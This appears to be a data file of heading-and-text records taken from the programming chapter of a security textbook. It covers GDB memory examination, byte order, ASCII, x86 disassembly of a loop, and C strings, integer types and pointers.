<main+16>: 0x45c7 0x00fc 0x0000 0x8300 0xfc7d 0x7e09 0xeb02 0xc713\n(gdb) x/8xw $eip\n0x8048384 <main+16>: 0x00fc45c7 0x83000000 0x7e09fc7d 0xc713eb02\n0x8048394 <main+32>: 0x84842404 0x01e80804 0x8dffffff 0x00fffc45\n(gdb)\nIf you look closely, you may notice something odd about the data above.\nThe first examine command shows the first eight bytes, and naturally, the\nexamine commands that use bigger units display more data in total. However,\nthe first examine shows the first two bytes to be 0xc7 and 0x45, but when a\nhalfword is examined at the exact same memory address, the value 0x45c7 is\nshown, with the bytes reversed. This same byte-reversal effect can be seen\nwhen a full four-byte word is shown as 0x00fc45c7, but when the first four bytes\nare shown byte by byte, they are in the order of 0xc7, 0x45, 0xfc, and 0x00.\nThis is because on the x86 processor values are stored in little-endian\nbyteorder, which means the least significant byte is stored first. For example,\niffour bytes are to be interpreted as a single value, the bytes must be used\ninreverse order. The GDB debugger is smart enough to know how values\nare stored, so when a word or halfword is examined, the bytes must be\nreversed to display the correct values in hexadecimal. Revisiting these\nvalues displayed both as hexadecimal and unsigned decimals might help\nclear up any confusion.\n(gdb) x/4xb $eip\n0x8048384 <main+16>: 0xc7 0x45 0xfc 0x00\n(gdb) x/4ub $eip\n0x8048384 <main+16>: 199 69 252 0\n(gdb) x/1xw $eip\n0x8048384 <main+16>: 0x00fc45c7\n(gdb) x/1uw $eip\n0x8048384 <main+16>: 16532935\n(gdb) quit\nThe program is running. Exit anyway? (y or n) y\nreader@hacking:~/booksrc $ bc -ql\n199*(256^3) + 69*(256^2) + 252*(256^1) + 0*(256^0)\n3343252480\n0*(256^3) + 252*(256^2) + 69*(256^1) + 199*(256^0)\n16532935\nquit\nreader@hacking:~/booksrc $\nProgramming 29\nThe first four bytes are shown both in hexadecimal and standard unsigned\ndecimal notation. A command-line calculator program called bc is used to show\nthat if the bytes are interpreted in the incorrect order, a horribly incorrect\nvalue of 3343252480 is the result. The byte order of a given architecture is an\nimportant detail to be aware of. While most debugging tools and compilers\nwill take care of the details of byte order automatically, eventually you will\ndirectly manipulate memory by yourself.\nIn addition to converting byte order, GDB can do other conversions with\nthe examine command. We’ve already seen that GDB can disassemble machine\nlanguage instructions into human-readable assembly instructions. The examine\ncommand also accepts the format letter i, short for instruction, to display the\nmemory as disassembled assembly language instructions.\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) break main\nBreakpoint 1 at 0x8048384: file firstprog.c, line 6.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nBreakpoint 1, main () at firstprog.c:6\n6 for(i=0; i < 10; i++)\n(gdb) i r $eip\neip 0x8048384 0x8048384 <main+16>\n(gdb) x/i $eip\n0x8048384 <main+16>: mov DWORD PTR [ebp-4],0x0\n(gdb) x/3i $eip\n0x8048384 <main+16>: mov DWORD PTR [ebp-4],0x0\n0x804838b <main+23>: cmp DWORD PTR [ebp-4],0x9\n0x804838f <main+27>: jle 0x8048393 <main+31>\n(gdb) x/7xb $eip\n0x8048384 <main+16>: 0xc7 0x45 0xfc 0x00 0x00 0x00 0x00\n(gdb) x/i $eip\n0x8048384 <main+16>: mov DWORD PTR [ebp-4],0x0\n(gdb)\nIn the output above, the a.out program is run in GDB, with a breakpoint\nset at main(). Since the EIP register is pointing to memory that actually con-\ntains machine language instructions, they disassemble quite nicely.\nThe previous objdump disassembly confirms that the seven bytes EIP is\npointing to actually are machine language for the corresponding assembly\ninstruction.\n8048384: c7 45 fc 00 00 00 00 mov DWORD PTR [ebp-4],0x0\nThis assembly instruction will move the value of 0 into memory located\nat the address stored in the EBP register, minus 4. This is where the C vari-\nable i is stored in memory; i was declared as an integer that uses 4 bytes of\nmemory on the x86 processor. Basically, this command will zero out the\n30 0x200\nvariable i for the for loop. If that memory is examined right now, it will\ncontain nothing but random garbage. The memory at this location can be\nexamined several different ways.\n(gdb) i r ebp\nebp 0xbffff808 0xbffff808\n(gdb) x/4xb $ebp - 4\n0xbffff804: 0xc0 0x83 0x04 0x08\n(gdb) x/4xb 0xbffff804\n0xbffff804: 0xc0 0x83 0x04 0x08\n(gdb) print $ebp - 4\n$1 = (void *) 0xbffff804\n(gdb) x/4xb $1\n0xbffff804: 0xc0 0x83 0x04 0x08\n(gdb) x/xw $1\n0xbffff804: 0x080483c0\n(gdb)\nThe EBP register is shown to contain the address 0xbffff808, and the\nassembly instruction will be writing to a value offset by 4 less than that,\n0xbffff804. The examine command can examine this memory address\ndirectly or by doing the math on the fly. The print command can also be\nused to do simple math, but the result is stored in a temporary variable in\nthe debugger. This variable named $1 can be used later to quickly re-access\naparticular location in memory. Any of the methods shown above will accom-\nplish the same task: displaying the 4 garbage bytes found in memory that\nwill be zeroed out when the current instruction executes.\nLet’s execute the current instruction using the command nexti, which is\nshort for next instruction. The processor will read the instruction at EIP, execute\nit, and advance EIP to the next instruction.\n(gdb) nexti\n0x0804838b 6 for(i=0; i < 10; i++)\n(gdb) x/4xb $1\n0xbffff804: 0x00 0x00 0x00 0x00\n(gdb) x/dw $1\n0xbffff804: 0\n(gdb) i r eip\neip 0x804838b 0x804838b <main+23>\n(gdb) x/i $eip\n0x804838b <main+23>: cmp DWORD PTR [ebp-4],0x9\n(gdb)\nAs predicted, the previous command zeroes out the 4 bytes found at EBP\nminus 4, which is memory set aside for the C variable i. Then EIP advances to\nthe next instruction. The next few instructions actually make more sense to\ntalk about in a group.\nProgramming 31\n(gdb) x/10i $eip\n0x804838b <main+23>: cmp DWORD PTR [ebp-4],0x9\n0x804838f <main+27>: jle 0x8048393 <main+31>\n0x8048391 <main+29>: jmp 0x80483a6 <main+50>\n0x8048393 <main+31>: mov DWORD PTR [esp],0x8048484\n0x804839a <main+38>: call 0x80482a0 <printf@plt>\n0x804839f <main+43>: lea eax,[ebp-4]\n0x80483a2 <main+46>: inc DWORD PTR [eax]\n0x80483a4 <main+48>: jmp 0x804838b <main+23>\n0x80483a6 <main+50>: leave\n0x80483a7 <main+51>: ret\n(gdb)\nThe first instruction, cmp, is a compare instruction, which will compare\nthe memory used by the C variable i with the value 9. The next instruction,\njle stands for jump if less than or equal to. It uses the results of the previous\ncomparison (which are actually stored in the EFLAGS register) to jump EIP\nto point to a different part of the code if the destination of the previous\ncomparison operation is less than or equal to the source. In this case the\ninstruction says to jump to the address 0x8048393 if the value stored in memory\nfor the C variable i is less than or equal to the value 9. If this isn’t the case,\nthe EIP will continue to the next instruction, which is an unconditional jump\ninstruction. This will cause the EIP to jump to the address 0x80483a6. These\nthree instructions combine to create an if-then-else control structure: If the i\nis less than or equal to 9, then go to the instruction at address 0x8048393; otherwise,\ngo to the instruction at address 0x80483a6. The first address of 0x8048393 (shown in\nbold) is simply the instruction found after the fixed jump instruction, and\nthe second address of 0x80483a6 (shown in italics) is located at the end of the\nfunction.\nSince we know the value 0 is stored in the memory location being com-\npared with the value 9, and we know that 0 is less than or equal to 9, EIP\nshould be at 0x8048393 after executing the next two instructions.\n(gdb) nexti\n0x0804838f 6 for(i=0; i < 10; i++)\n(gdb) x/i $eip\n0x804838f <main+27>: jle 0x8048393 <main+31>\n(gdb) nexti\n8 printf(\"Hello, world!\\n\");\n(gdb) i r eip\neip 0x8048393 0x8048393 <main+31>\n(gdb) x/2i $eip\n0x8048393 <main+31>: mov DWORD PTR [esp],0x8048484\n0x804839a <main+38>: call 0x80482a0 <printf@plt>\n(gdb)\nAs expected, the previous two instructions let the program execution\nflow down to 0x8048393, which brings us to the next two instructions. The\n32 0x200\nfirst instruction is another mov instruction that will write the address 0x8048484\ninto the memory address contained in the ESP register. But what is ESP\npointing to?\n(gdb) i r esp\nesp 0xbffff800 0xbffff800\n(gdb)\nCurrently, ESP points to the memory address 0xbffff800, so when the mov\ninstruction is executed, the address 0x8048484 is written there. But why? What’s\nso special about the memory address 0x8048484? There’s one way to find out.\n(gdb) x/2xw 0x8048484\n0x8048484: 0x6c6c6548 0x6f57206f\n(gdb) x/6xb 0x8048484\n0x8048484: 0x48 0x65 0x6c 0x6c 0x6f 0x20\n(gdb) x/6ub 0x8048484\n0x8048484: 72 101 108 108 111 32\n(gdb)\nA trained eye might notice something about the memory here, in par-\nticular the range of the bytes. After examining memory for long enough,\nthese types of visual patterns become more apparent. These bytes fall within\nthe printable ASCII range. ASCII is an agreed-upon standard that maps\nallthe characters on your keyboard (and some that aren’t) to fixed numbers.\nThe bytes 0x48, 0x65, 0x6c, and 0x6f all correspond to letters in the alphabet on\nthe ASCII table shown below. This table is found in the man page for ASCII,\navailable on most Unix systems by typing man ascii.\nASCII Table\nOct Dec Hex Char Oct Dec Hex Char\n------------------------------------------------------------\n000 0 00 NUL '\\0' 100 64 40 @\n001 1 01 SOH 101 65 41 A\n002 2 02 STX 102 66 42 B\n003 3 03 ETX 103 67 43 C\n004 4 04 EOT 104 68 44 D\n005 5 05 ENQ 105 69 45 E\n006 6 06 ACK 106 70 46 F\n007 7 07 BEL '\\a' 107 71 47 G\n010 8 08 BS '\\b' 110 72 48 H\n011 9 09 HT '\\t' 111 73 49 I\n012 10 0A LF '\\n' 112 74 4A J\n013 11 0B VT '\\v' 113 75 4B K\n014 12 0C FF '\\f' 114 76 4C L\n015 13 0D CR '\\r' 115 77 4D M\n016 14 0E SO 116 78 4E N\n017 15 0F SI 117 79 4F O\n020 16 10 DLE 120 80 50 P\n021 17 11 DC1 121 81 51 Q\nProgramming 33\n022 18 12 DC2 122 82 52 R\n023 19 13 DC3 123 83 53 S\n024 20 14 DC4 124 84 54 T\n025 21 15 NAK 125 85 55 U\n026 22 16 SYN 126 86 56 V\n027 23 17 ETB 127 87 57 W\n030 24 18 CAN 130 88 58 X\n031 25 19 EM 131 89 59 Y\n032 26 1A SUB 132 90 5A Z\n033 27 1B ESC 133 91 5B [\n034 28 1C FS 134 92 5C \\ '\\\\'\n035 29 1D GS 135 93 5D ]\n036 30 1E RS 136 94 5E ^\n037 31 1F US 137 95 5F _\n040 32 20 SPACE 140 96 60 `\n041 33 21 ! 141 97 61 a\n042 34 22 \" 142 98 62 b\n043 35 23 # 143 99 63 c\n044 36 24 $ 144 100 64 d\n045 37 25 % 145 101 65 e\n046 38 26 & 146 102 66 f\n047 39 27 ' 147 103 67 g\n050 40 28 ( 150 104 68 h\n051 41 29 ) 151 105 69 i\n052 42 2A * 152 106 6A j\n053 43 2B + 153 107 6B k\n054 44 2C , 154 108 6C l\n055 45 2D - 155 109 6D m\n056 46 2E . 156 110 6E n\n057 47 2F / 157 111 6F o\n060 48 30 0 160 112 70 p\n061 49 31 1 161 113 71 q\n062 50 32 2 162 114 72 r\n063 51 33 3 163 115 73 s\n064 52 34 4 164 116 74 t\n065 53 35 5 165 117 75 u\n066 54 36 6 166 118 76 v\n067 55 37 7 167 119 77 w\n070 56 38 8 170 120 78 x\n071 57 39 9 171 121 79 y\n072 58 3A : 172 122 7A z\n073 59 3B ; 173 123 7B {\n074 60 3C < 174 124 7C |\n075 61 3D = 175 125 7D }\n076 62 3E > 176 126 7E ~\n077 63 3F ? 177 127 7F DEL\nThankfully, GDB’s examine command also contains provisions for look-\ning at this type of memory. The c format letter can be used to automatically\nlook up a byte on the ASCII table, and the s format letter will display an\nentire string of character data.\n34 0x200\n(gdb) x/6cb 0x8048484\n0x8048484: 72 'H' 101 'e' 108 'l' 108 'l' 111 'o' 32 ' '\n(gdb) x/s 0x8048484\n0x8048484: \"Hello, world!\\n\"\n(gdb)\nThese commands reveal that the data string \"Hello, world!\\n\" is stored at\nmemory address 0x8048484. This string is the argument for the printf() func-\ntion, which indicates that moving the address of this string to the address\nstored in ESP (0x8048484) has something to do with this function. The following\noutput shows the data string’s address being moved into the address ESP is\npointing to.\n(gdb) x/2i $eip\n0x8048393 <main+31>: mov DWORD PTR [esp],0x8048484\n0x804839a <main+38>: call 0x80482a0 <printf@plt>\n(gdb) x/xw $esp\n0xbffff800: 0xb8000ce0\n(gdb) nexti\n0x0804839a 8 printf(\"Hello, world!\\n\");\n(gdb) x/xw $esp\n0xbffff800: 0x08048484\n(gdb)\nThe next instruction is actually called the printf() function; it prints the\ndata string. The previous instruction was setting up for the function call, and\nthe results of the function call can be seen in the output below in bold.\n(gdb) x/i $eip\n0x804839a <main+38>: call 0x80482a0 <printf@plt>\n(gdb) nexti\nHello, world!\n6 for(i=0; i < 10; i++)\n(gdb)\nContinuing to use GDB to debug, let’s examine the next two instructions.\nOnce again, they make more sense to look at in a group.\n(gdb) x/2i $eip\n0x804839f <main+43>: lea eax,[ebp-4]\n0x80483a2 <main+46>: inc DWORD PTR [eax]\n(gdb)\nThese two instructions basically just increment the variable i by 1. The\nlea instruction is an acronym for Load Effective Address, which will load the\nProgramming 35\nfamiliar address of EBP minus 4 into the EAX register. The execution of this\ninstruction is shown below.\n(gdb) x/i $eip\n0x804839f <main+43>: lea eax,[ebp-4]\n(gdb) print $ebp - 4\n$2 = (void *) 0xbffff804\n(gdb) x/x $2\n0xbffff804: 0x00000000\n(gdb) i r eax\neax 0xd 13\n(gdb) nexti\n0x080483a2 6 for(i=0; i < 10; i++)\n(gdb) i r eax\neax 0xbffff804 -1073743868\n(gdb) x/xw $eax\n0xbffff804: 0x00000000\n(gdb) x/dw $eax\n0xbffff804: 0\n(gdb)\nThe following inc instruction will increment the value found at this address\n(now stored in the EAX register) by 1. The execution of this instruction is also\nshown below.\n(gdb) x/i $eip\n0x80483a2 <main+46>: inc DWORD PTR [eax]\n(gdb) x/dw $eax\n0xbffff804: 0\n(gdb) nexti\n0x080483a4 6 for(i=0; i < 10; i++)\n(gdb) x/dw $eax\n0xbffff804: 1\n(gdb)\nThe end result is the value stored at the memory address EBP minus 4\n(0xbffff804), incremented by 1. This behavior corresponds to a portion of C\ncode in which the variable i is incremented in the for loop.\nThe next instruction is an unconditional jump instruction.\n(gdb) x/i $eip\n0x80483a4 <main+48>: jmp 0x804838b <main+23>\n(gdb)\nWhen this instruction is executed, it will send the program back to the\ninstruction at address 0x804838b. It does this by simply setting EIP to that value.\nLooking at the full disassembly again, you should be able to tell which\nparts of the C code have been compiled into which machine instructions.\n36 0x200"
  },
  {
    "input": "0x260 Back to Basics",
    "output": "(gdb) disass main\nDump of assembler code for function main:\n0x08048374 <main+0>: push ebp\n0x08048375 <main+1>: mov ebp,esp\n0x08048377 <main+3>: sub esp,0x8\n0x0804837a <main+6>: and esp,0xfffffff0\n0x0804837d <main+9>: mov eax,0x0\n0x08048382 <main+14>: sub esp,eax\n0x08048384 <main+16>: mov DWORD PTR [ebp-4],0x0\n0x0804838b <main+23>: cmp DWORD PTR [ebp-4],0x9\n0x0804838f <main+27>: jle 0x8048393 <main+31>\n0x08048391 <main+29>: jmp 0x80483a6 <main+50>\n0x08048393 <main+31>: mov DWORD PTR [esp],0x8048484\n0x0804839a <main+38>: call 0x80482a0 <printf@plt>\n0x0804839f <main+43>: lea eax,[ebp-4]\n0x080483a2 <main+46>: inc DWORD PTR [eax]\n0x080483a4 <main+48>: jmp 0x804838b <main+23>\n0x080483a6 <main+50>: leave\n0x080483a7 <main+51>: ret\nEnd of assembler dump.\n(gdb) list\n1 #include <stdio.h>\n2\n3 int main()\n4 {\n5 int i;\n6 for(i=0; i < 10; i++)\n7 {\n8 printf(\"Hello, world!\\n\");\n9 }\n10 }\n(gdb)\nThe instructions shown in bold make up the for loop, and the instruc-\ntions in italics are the printf() call found within the loop. The program exe-\ncution will jump back to the compare instruction, continue to execute the\nprintf() call, and increment the counter variable until it finally equals 10. At\nthis point the conditional jle instruction won’t execute; instead, the instruc-\ntion pointer will continue to the unconditional jump instruction, which exits\nthe loop and ends the program.\n0x260 Back to Basics\nNow that the idea of programming is less abstract, there are a few other\nimportant concepts to know about C. Assembly language and computer\nprocessors existed before higher-level programming languages, and many\nmodern programming concepts have evolved through time. In the same way\nthat knowing a little about Latin can greatly improve one’s understanding of\nProgramming 37"
  },
  {
    "input": "0x261 Strings",
    "output": "the English language, knowledge of low-level programming concepts can\nassist the comprehension of higher-level ones. When continuing to the next\nsection, remember that C code must be compiled into machine instructions\nbefore it can do anything.\n0x261 Strings\nThe value \"Hello, world!\\n\" passed to the printf() function in the previous\nprogram is a string—technically, a character array. In C, an array is simply a\nlist of n elements of a specific data type. A 20-character array is simply 20\nadjacent characters located in memory. Arrays are also referred to as buffers.\nThe char_array.c program is an example of a character array.\nchar_array.c\n#include <stdio.h>\nint main()\n{\nchar str_a[20];\nstr_a[0] = 'H';\nstr_a[1] = 'e';\nstr_a[2] = 'l';\nstr_a[3] = 'l';\nstr_a[4] = 'o';\nstr_a[5] = ',';\nstr_a[6] = ' ';\nstr_a[7] = 'w';\nstr_a[8] = 'o';\nstr_a[9] = 'r';\nstr_a[10] = 'l';\nstr_a[11] = 'd';\nstr_a[12] = '!';\nstr_a[13] = '\\n';\nstr_a[14] = 0;\nprintf(str_a);\n}\nThe GCC compiler can also be given the -o switch to define the output\nfile to compile to. This switch is used below to compile the program into an\nexecutable binary called char_array.\nreader@hacking:~/booksrc $ gcc -o char_array char_array.c\nreader@hacking:~/booksrc $ ./char_array\nHello, world!\nreader@hacking:~/booksrc $\nIn the preceding program, a 20-element character array is defined as\nstr_a, and each element of the array is written to, one by one. Notice that the\nnumber begins at 0, as opposed to 1. Also notice that the last character is a 0.\n(This is also called a null byte.) The character array was defined, so 20 bytes\nare allocated for it, but only 12 of these bytes are actually used. The null byte\n38 0x200\nat the end is used as a delimiter character to tell any function that is dealing\nwith the string to stop operations right there. The remaining extra bytes are\njust garbage and will be ignored. If a null byte is inserted in the fifth element\nof the character array, only the characters Hello would be printed by the\nprintf() function.\nSince setting each character in a character array is painstaking and\nstrings are used fairly often, a set of standard functions was created for string\nmanipulation. For example, the strcpy() function will copy a string from a\nsource to a destination, iterating through the source string and copying each\nbyte to the destination (and stopping after it copies the null termination byte).\nThe order of the function’s arguments is similar to Intel assembly syntax:\ndestination first and then source. The char_array.c program can be rewritten\nusing strcpy() to accomplish the same thing using the string library. The\nnext version of the char_array program shown below includes string.h since\nit uses a string function.\nchar_array2.c\n#include <stdio.h>\n#include <string.h>\nint main() {\nchar str_a[20];\nstrcpy(str_a, \"Hello, world!\\n\");\nprintf(str_a);\n}\nLet’s take a look at this program with GDB. In the output below, the\ncompiled program is opened with GDB and breakpoints are set before, in, and\nafter the strcpy() call shown in bold. The debugger will pause the program at\neach breakpoint, giving us a chance to examine registers and memory. The\nstrcpy() function’s code comes from a shared library, so the breakpoint in this\nfunction can’t actually be set until the program is executed.\nreader@hacking:~/booksrc $ gcc -g -o char_array2 char_array2.c\nreader@hacking:~/booksrc $ gdb -q ./char_array2\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list\n1 #include <stdio.h>\n2 #include <string.h>\n3\n4 int main() {\n5 char str_a[20];\n6\n7 strcpy(str_a, \"Hello, world!\\n\");\n8 printf(str_a);\n9 }\n(gdb) break 6\nBreakpoint 1 at 0x80483c4: file char_array2.c, line 6.\n(gdb) break strcpy\nProgramming 39\nFunction \"strcpy\" not defined.\nMake breakpoint pending on future shared library load? (y or [n]) y\nBreakpoint 2 (strcpy) pending.\n(gdb) break 8\nBreakpoint 3 at 0x80483d7: file char_array2.c, line 8.\n(gdb)\nWhen the program is run, the strcpy() breakpoint is resolved. At each\nbreakpoint, we’re going to look at EIP and the instructions it points to. Notice\nthat the memory location for EIP at the middle breakpoint is different.\n(gdb) run\nStarting program: /home/reader/booksrc/char_array2\nBreakpoint 4 at 0xb7f076f4\nPending breakpoint \"strcpy\" resolved\nBreakpoint 1, main () at char_array2.c:7\n7 strcpy(str_a, \"Hello, world!\\n\");\n(gdb) i r eip\neip 0x80483c4 0x80483c4 <main+16>\n(gdb) x/5i $eip\n0x80483c4 <main+16>: mov DWORD PTR [esp+4],0x80484c4\n0x80483cc <main+24>: lea eax,[ebp-40]\n0x80483cf <main+27>: mov DWORD PTR [esp],eax\n0x80483d2 <main+30>: call 0x80482c4 <strcpy@plt>\n0x80483d7 <main+35>: lea eax,[ebp-40]\n(gdb) continue\nContinuing.\nBreakpoint 4, 0xb7f076f4 in strcpy () from /lib/tls/i686/cmov/libc.so.6\n(gdb) i r eip\neip 0xb7f076f4 0xb7f076f4 <strcpy+4>\n(gdb) x/5i $eip\n0xb7f076f4 <strcpy+4>: mov esi,DWORD PTR [ebp+8]\n0xb7f076f7 <strcpy+7>: mov eax,DWORD PTR [ebp+12]\n0xb7f076fa <strcpy+10>: mov ecx,esi\n0xb7f076fc <strcpy+12>: sub ecx,eax\n0xb7f076fe <strcpy+14>: mov edx,eax\n(gdb) continue\nContinuing.\nBreakpoint 3, main () at char_array2.c:8\n8 printf(str_a);\n(gdb) i r eip\neip 0x80483d7 0x80483d7 <main+35>\n(gdb) x/5i $eip\n0x80483d7 <main+35>: lea eax,[ebp-40]\n0x80483da <main+38>: mov DWORD PTR [esp],eax\n0x80483dd <main+41>: call 0x80482d4 <printf@plt>\n0x80483e2 <main+46>: leave\n0x80483e3 <main+47>: ret\n(gdb)\n40 0x200"
  },
  {
    "input": "0x262 Signed, Unsigned, Long, and Short",
    "output": "The address in EIP at the middle breakpoint is different because the\ncode for the strcpy() function comes from a loaded library. In fact, the\ndebugger shows EIP for the middle breakpoint in the strcpy() function,\nwhile EIP at the other two breakpoints is in the main() function. I’d like to\npoint out that EIP is able to travel from the main code to the strcpy() code\nand back again. Each time a function is called, a record is kept on a data\nstructure simply called the stack. The stack lets EIP return through long\nchains of function calls. In GDB, the bt command can be used to backtrace the\nstack. In the output below, the stack backtrace is shown at each breakpoint.\n(gdb) run\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/reader/booksrc/char_array2\nError in re-setting breakpoint 4:\nFunction \"strcpy\" not defined.\nBreakpoint 1, main () at char_array2.c:7\n7 strcpy(str_a, \"Hello, world!\\n\");\n(gdb) bt\n#0 main () at char_array2.c:7\n(gdb) cont\nContinuing.\nBreakpoint 4, 0xb7f076f4 in strcpy () from /lib/tls/i686/cmov/libc.so.6\n(gdb) bt\n#0 0xb7f076f4 in strcpy () from /lib/tls/i686/cmov/libc.so.6\n#1 0x080483d7 in main () at char_array2.c:7\n(gdb) cont\nContinuing.\nBreakpoint 3, main () at char_array2.c:8\n8 printf(str_a);\n(gdb) bt\n#0 main () at char_array2.c:8\n(gdb)\nAt the middle breakpoint, the backtrace of the stack shows its record of\nthe strcpy() call. Also, you may notice that the strcpy() function is at a slightly\ndifferent address during the second run. This is due to an exploit protection\nmethod that is turned on by default in the Linux kernel since 2.6.11. We will\ntalk about this protection in more detail later.\n0x262 Signed, Unsigned, Long, and Short\nBy default, numerical values in C are signed, which means they can be both\nnegative and positive. In contrast, unsigned values don’t allow negative num-\nbers. Since it’s all just memory in the end, all numerical values must be stored\nin binary, and unsigned values make the most sense in binary. A 32-bit\nunsigned integer can contain values from 0 (all binary 0s) to 4,294,967,295\n(all binary 1s). A 32-bit signed integer is still just 32 bits, which means it can\nProgramming 41\nonly be in one of 232 possible bit combinations. This allows 32-bit signed\nintegers to range from −2,147,483,648 to 2,147,483,647. Essentially, one of\nthe bits is a flag marking the value positive or negative. Positively signed values\nlook the same as unsigned values, but negative numbers are stored differently\nusing a method called two’s complement. Two’s complement represents neg-\native numbers in a form suited for binary adders—when a negative value in\ntwo’s complement is added to a positive number of the same magnitude, the\nresult will be 0. This is done by first writing the positive number in binary, then\ninverting all the bits, and finally adding 1. It sounds strange, but it works and\nallows negative numbers to be added in combination with positive numbers\nusing simple binary adders.\nThis can be explored quickly on a smaller scale using pcalc, a simple\nprogrammer’s calculator that displays results in decimal, hexadecimal, and\nbinary formats. For simplicity’s sake, 8-bit numbers are used in this example.\nreader@hacking:~/booksrc $ pcalc 0y01001001\n73 0x49 0y1001001\nreader@hacking:~/booksrc $ pcalc 0y10110110 + 1\n183 0xb7 0y10110111\nreader@hacking:~/booksrc $ pcalc 0y01001001 + 0y10110111\n256 0x100 0y100000000\nreader@hacking:~/booksrc $\nFirst, the binary value 01001001 is shown to be positive 73. Then all the\nbits are flipped, and 1 is added to result in the two’s complement representa-\ntion for negative 73, 10110111. When these two values are added together,\nthe result of the original 8 bits is 0. The program pcalc shows the value 256\nbecause it’s not aware that we’re only dealing with 8-bit values. In a binary\nadder, that carry bit would just be thrown away because the end of the vari-\nable’s memory would have been reached. This example might shed some\nlight on how two’s complement works its magic.\nIn C, variables can be declared as unsigned by simply prepending the\nkeyword unsigned to the declaration. An unsigned integer would be declared\nwith unsigned int. In addition, the size of numerical variables can be extended\nor shortened by adding the keywords long or short. The actual sizes will vary\ndepending on the architecture the code is compiled for. The language of C\nprovides a macro called sizeof() that can determine the size of certain data\ntypes. This works like a function that takes a data type as its input and returns\nthe size of a variable declared with that data type for the target architecture.\nThe datatype_sizes.c program explores the sizes of various data types, using\nthe sizeof() function.\ndatatype_sizes.c\n#include <stdio.h>\nint main() {\nprintf(\"The 'int' data type is\\t\\t %d bytes\\n\", sizeof(int));\n42 0x200"
  },
  {
    "input": "0x263 Pointers",
    "output": "printf(\"The 'unsigned int' data type is\\t %d bytes\\n\", sizeof(unsigned int));\nprintf(\"The 'short int' data type is\\t %d bytes\\n\", sizeof(short int));\nprintf(\"The 'long int' data type is\\t %d bytes\\n\", sizeof(long int));\nprintf(\"The 'long long int' data type is %d bytes\\n\", sizeof(long long int));\nprintf(\"The 'float' data type is\\t %d bytes\\n\", sizeof(float));\nprintf(\"The 'char' data type is\\t\\t %d bytes\\n\", sizeof(char));\n}\nThis piece of code uses the printf() function in a slightly different way.\nIt uses something called a format specifier to display the value returned from\nthe sizeof() function calls. Format specifiers will be explained in depth later,\nso for now, let’s just focus on the program’s output.\nreader@hacking:~/booksrc $ gcc datatype_sizes.c\nreader@hacking:~/booksrc $ ./a.out\nThe 'int' data type is 4 bytes\nThe 'unsigned int' data type is 4 bytes\nThe 'short int' data type is 2 bytes\nThe 'long int' data type is 4 bytes\nThe 'long long int' data type is 8 bytes\nThe 'float' data type is 4 bytes\nThe 'char' data type is 1 bytes\nreader@hacking:~/booksrc $\nAs previously stated, both signed and unsigned integers are four bytes in\nsize on the x86 architecture. A float is also four bytes, while a char only needs\na single byte. The long and short keywords can also be used with floating-point\nvariables to extend and shorten their sizes.\n0x263 Pointers\nThe EIP register is a pointer that “points” to the current instruction during a\nprogram’s execution by containing its memory address. The idea of pointers\nis used in C, also. Since the physical memory cannot actually be moved, the\ninformation in it must be copied. It can be very computationally expensive to\ncopy large chunks of memory to be used by different functions or in differ-\nent places. This is also expensive from a memory standpoint, since space for\nthe new destination copy must be saved or allocated before the source can be\ncopied. Pointers are a solution to this problem. Instead of copying a large\nblock of memory, it is much simpler to pass around the address of the begin-\nning of that block of memory.\nPointers in C can be defined and used like any other variable type.\nSincememory on the x86 architecture uses 32-bit addressing, pointers are\nalso 32bits in size (4 bytes). Pointers are defined by prepending an asterisk (*)\nto the variable name. Instead of defining a variable of that type, a pointer is\ndefined as something that points to data of that type. The pointer.c program\nis an example of a pointer being used with the char data type, which is only\n1byte in size.\nProgramming 43\npointer.c\n#include <stdio.h>\n#include <string.h>\nint main() {\nchar str_a[20]; // A 20-element character array\nchar *pointer; // A pointer, meant for a character array\nchar *pointer2; // And yet another one\nstrcpy(str_a, \"Hello, world!\\n\");\npointer = str_a; // Set the first pointer to the start of the array.\nprintf(pointer);\npointer2 = pointer + 2; // Set the second one 2 bytes further in.\nprintf(pointer2); // Print it.\nstrcpy(pointer2, \"y you guys!\\n\"); // Copy into that spot.\nprintf(pointer); // Print again.\n}\nAs the comments in the code indicate, the first pointer is set at the begin-\nning of the character array. When the character array is referenced like this,\nit is actually a pointer itself. This is how this buffer was passed as a pointer to\nthe printf() and strcpy() functions earlier. The second pointer is set to the\nfirst pointer’s address plus two, and then some things are printed (shown in\nthe output below).\nreader@hacking:~/booksrc $ gcc -o pointer pointer.c\nreader@hacking:~/booksrc $ ./pointer\nHello, world!\nllo, world!\nHey you guys!\nreader@hacking:~/booksrc $\nLet’s take a look at this with GDB. The program is recompiled, and a\nbreakpoint is set on the tenth line of the source code. This will stop the\nprogram after the \"Hello, world!\\n\" string has been copied into the str_a\nbuffer and the pointer variable is set to the beginning of it.\nreader@hacking:~/booksrc $ gcc -g -o pointer pointer.c\nreader@hacking:~/booksrc $ gdb -q ./pointer\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list\n1 #include <stdio.h>\n2 #include <string.h>\n3\n4 int main() {\n5 char str_a[20]; // A 20-element character array\n6 char *pointer; // A pointer, meant for a character array\n44 0x200\n7 char *pointer2; // And yet another one\n8\n9 strcpy(str_a, \"Hello, world!\\n\");\n10 pointer = str_a; // Set the first pointer to the start of the array.\n(gdb)\n11 printf(pointer);\n12\n13 pointer2 = pointer + 2; // Set the second one 2 bytes further in.\n14 printf(pointer2); // Print it.\n15 strcpy(pointer2, \"y you guys!\\n\"); // Copy into that spot.\n16 printf(pointer); // Print again.\n17 }\n(gdb) break 11\nBreakpoint 1 at 0x80483dd: file pointer.c, line 11.\n(gdb) run\nStarting program: /home/reader/booksrc/pointer\nBreakpoint 1, main () at pointer.c:11\n11 printf(pointer);\n(gdb) x/xw pointer\n0xbffff7e0: 0x6c6c6548\n(gdb) x/s pointer\n0xbffff7e0: \"Hello, world!\\n\"\n(gdb)\nWhen the pointer is examined as a string, it’s apparent that the given\nstring is there and is located at memory address 0xbffff7e0. Remember that\nthe string itself isn’t stored in the pointer variable—only the memory address\n0xbffff7e0 is stored there.\nIn order to see the actual data stored in the pointer variable, you must\nuse the address-of operator. The address-of operator is a unary operator,\nwhich simply means it operates on a single argument. This operator is just\nan ampersand (&) prepended to a variable name. When it’s used, the 